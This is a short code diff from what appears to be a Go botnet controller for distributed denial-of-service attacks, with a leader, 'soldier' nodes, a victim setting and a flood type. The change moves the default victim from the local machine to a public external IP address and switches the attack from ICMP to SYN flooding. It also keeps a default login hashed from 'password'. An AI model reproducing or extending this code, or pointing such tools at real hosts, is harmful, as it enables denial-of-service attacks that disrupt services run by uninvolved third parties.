@@ -30,13 +30,13 @@ func HashOf(password string) string {
 }
 
 func (d *Dispatcher) SetupDefault() {
-	d.ListeningAddress = "localhost"
+	d.ListeningAddress = "127.0.0.1"
 	d.ListeningPort = "8080"
 	d.Cmp.Leader.Name = "leader"
 	d.Cmp.Leader.AuthenticationHash = HashOf("password")
 	d.Cmp.Settings.Status = StatusStopped
-	d.Cmp.Settings.VictimServer = "127.0.0.1:8080"
-	d.Cmp.Settings.DDOSType = DDOSTypeICMP
+	d.Cmp.Settings.VictimServer = "142.251.37.174:80"
+	d.Cmp.Settings.DDOSType = DDOSTypeSYN
 	d.Cmp.Soldiers = make([]Soldier, 0)
 }
 
